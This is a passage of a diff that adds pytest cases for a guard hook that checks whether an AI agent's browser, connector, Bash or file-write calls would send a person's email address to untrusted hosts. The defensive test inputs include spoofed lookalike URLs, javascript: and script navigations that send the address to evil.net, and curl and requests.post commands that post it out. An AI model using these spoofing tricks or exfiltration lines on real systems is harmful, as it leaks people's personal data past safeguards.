@@ -4396,6 +4396,198 @@ def test_email_guard_silent_otherwise(tool, tool_input):
     assert _asked(_email_guard(tool, tool_input)) is None
 
 
+TRUSTED_HOSTS = "*.team-site.org, team-site.org, *-team-slug.vercel.app"
+TRUSTED_TOOLS = "mcp__crm__*, mcp__slack__send"
+TRUSTED = {
+    "DEV_HOOKS_EMAIL_TRUSTED_HOSTS": TRUSTED_HOSTS,
+    "DEV_HOOKS_EMAIL_TRUSTED_TOOLS": TRUSTED_TOOLS,
+}
+JO = "jo@friend-mail.com"
+BROWSER_BATCH = "mcp__Claude_Browser__browser_batch"
+_TYPE = {"name": "computer", "input": {"action": "type", "text": JO}}
+
+
+def _go(url, **more):
+    return {"name": "navigate", "input": {"url": url, **more}}
+
+
+def _typing_on(*urls, text=JO):
+    """A browser batch that opens each URL, then types an address."""
+    actions = [{"name": "navigate", "input": {"url": url}} for url in urls]
+    actions.append({"name": "computer", "input": {"action": "type", "text": text}})
+    return {"actions": actions}
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # A connector the person listed: it acts as them on a service that holds the address.
+        ("mcp__crm__createContact", {"name": "Jo", "emails": [JO]}),
+        ("mcp__CRM__search", {"query": JO}),
+        ("mcp__slack__send", {"text": f"Escalating to {JO}"}),
+        # A browser call whose every page is this machine or a trusted host.
+        (BROWSER_BATCH, _typing_on("http://127.0.0.1:8026/sign-in")),
+        (BROWSER_BATCH, _typing_on("localhost:3101")),
+        (BROWSER_BATCH, _typing_on("https://app.team-site.org/sign-in")),
+        (BROWSER_BATCH, _typing_on("https://APP.Team-Site.org:8443/sign-in")),
+        (
+            "mcp__claude-in-chrome__browser_batch",
+            _typing_on("https://app-git-my-branch-team-slug.vercel.app/x"),
+        ),
+        (
+            "mcp__Claude_Browser__navigate",
+            {"url": f"https://team-site.org/users?email={JO}"},
+        ),
+    ],
+)
+def test_email_guard_silent_on_connectors_and_trusted_pages(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input, **TRUSTED)) is None
+
+
+@pytest.mark.parametrize(
+    "tool",
+    [
+        # Not on the list; a listed name is matched whole, and `[` is no character class.
+        "mcp__terminal__run_in_terminal",
+        "mcp__crm2__createContact",
+        "mcp__slack__send_dm",
+        "mcp__x__y",
+    ],
+)
+def test_email_guard_asks_about_an_mcp_tool_not_listed(tool):
+    tools = TRUSTED_TOOLS + ", mcp__[a-z]__y"
+    r = _email_guard(tool, {"text": JO}, DEV_HOOKS_EMAIL_TRUSTED_TOOLS=tools)
+    assert _asked(r)
+
+
+@pytest.mark.parametrize(
+    "tool_input",
+    [
+        # No page named in the call: the guard can't tell where the typing lands.
+        _typing_on(),
+        # A trusted page beside one that isn't.
+        _typing_on("https://app.team-site.org/a", "https://forum.remote-site.org/b"),
+        # Hosts that only look trusted.
+        _typing_on("https://team-site.org.evil.net/a"),
+        _typing_on("https://evilteam-site.org/a"),
+        _typing_on("https://evil.net/team-site.org/"),
+        _typing_on("https://app.team-site.org@evil.net/"),
+        _typing_on("https://localhost.evil.net/"),
+        # A browser reads the backslash as a slash, so this page is evil.net.
+        _typing_on("https://evil.net\\@app.team-site.org/"),
+        _typing_on("javascript:fetch('//evil.net')"),
+        _typing_on("javascript://localhost/%0Afetch('//evil.net')"),
+        _typing_on("data://localhost/x"),
+        _typing_on("https://evil.net%2f.team-site.org/"),
+        _typing_on("https://evil.net/?next=https://app.team-site.org/"),
+        # A trusted remote host over plain http.
+        _typing_on("http://app.team-site.org/"),
+        # Typed before the trusted page opens, or into another tab.
+        {"actions": [_TYPE, _go("http://localhost:3000")]},
+        {
+            "actions": [
+                _go("http://localhost:3000", tabId="1"),
+                {"name": "computer", "input": {**_TYPE["input"], "tabId": "2"}},
+            ]
+        },
+        # A page named under another key, or as a list.
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"URL": "https://evil.net"}},
+                _TYPE,
+            ]
+        },
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"urls": ["https://evil.net"]}},
+                _TYPE,
+            ]
+        },
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"url": ["https://evil.net"]}},
+                _TYPE,
+            ]
+        },
+        # A "url" on a call that opens no page.
+        {"action": "type", "text": JO, "url": "http://localhost:3000"},
+        # A host named in the typed text is not the page.
+        _typing_on(text=f"{JO} https://team-site.org"),
+        # A page set by script rather than a navigate action.
+        {
+            "actions": [
+                {
+                    "name": "javascript_tool",
+                    "input": {"text": f"location = 'https://evil.net/?e={JO}'"},
+                }
+            ]
+        },
+    ],
+)
+def test_email_guard_asks_in_a_browser_off_trusted_pages(tool_input):
+    hosts = TRUSTED_HOSTS + ", [a-z]*.net"
+    r = _email_guard(BROWSER_BATCH, tool_input, DEV_HOOKS_EMAIL_TRUSTED_HOSTS=hosts)
+    assert _asked(r)
+
+
+def test_email_guard_asks_in_a_browser_about_a_remote_url():
+    tool_input = {"url": f"https://forum.remote-site.org/?email={JO}"}
+    assert _asked(_email_guard("mcp__claude-in-chrome__navigate", tool_input))
+
+
+def test_email_guard_trusts_no_remote_page_without_the_setting():
+    tool_input = _typing_on("https://app.team-site.org/")
+    assert _asked(_email_guard(BROWSER_BATCH, tool_input))
+
+
+SCRATCH = "/private/tmp/claude-501/-Users-jo-code/1c7267ce/scratchpad"
+
+
+@pytest.mark.parametrize(
+    "path,content,asks",
+    [
+        (f"{SCRATCH}/notes.py", f'OWNER = "{JO}"\n', False),
+        ("/tmp/claude-1000/x/scratchpad/rows.json", f'{{"owner": "{JO}"}}', False),
+        # Request code in a scratch file still asks: running it sends the address.
+        (f"{SCRATCH}/send.py", f'requests.post(U, json={{"e": "{JO}"}})', True),
+        (f"{SCRATCH}/send.sh", f'curl -d e={JO} "$1"', True),
+        (f"{SCRATCH}/issue.sh", f'gh issue comment 1 --body "cc {JO}"', True),
+        (f"{SCRATCH}/run.py", f'subprocess.run(["x", "{JO}"])', True),
+        # Only the session scratchpad, not any path with the word in it or leading out of it.
+        ("/repo/scratchpad/notes.py", f'OWNER = "{JO}"\n', True),
+        (f"{SCRATCH}/../../../../repo/settings.py", f'OWNER = "{JO}"\n', True),
+        ("/tmp/claude-x/../../repo/scratchpad/s.py", f'OWNER = "{JO}"\n', True),
+    ],
+)
+def test_email_guard_scratch_files_ask_only_with_request_code(path, content, asks):
+    r = _email_guard("Write", {"file_path": path, "content": content})
+    assert bool(_asked(r)) is asks
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # A Homebrew versioned formula's launchd file, and a Cloud SQL IAM database user.
+        "launchctl list | grep sh.brew.postgresql@15.plist; curl -sI https://x.org",
+        'psql "host=db.remote-site.org user=app-runner@proj-1.iam dbname=d" -c "select 1"',
+    ],
+)
+def test_email_guard_silent_on_launchd_files_and_iam_database_users(command):
+    assert _asked(_email_guard("Bash", {"command": command})) is None
+
+
+@pytest.mark.parametrize("suffix", [".plist", ".iam"])
+def test_email_guard_counts_a_real_address_with_a_suffix_added(suffix):
+    command = f"curl https://x.org -d e={JO}{suffix}"
+    assert _asked(_email_guard("Bash", {"command": command}))
+    in_header = "curl --user-agent" + f" 'bot {JO}{suffix}' https://x.org"
+    r = _email_guard("Bash", {"command": in_header})
+    assert json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
 @pytest.mark.parametrize(
     "command",
     [
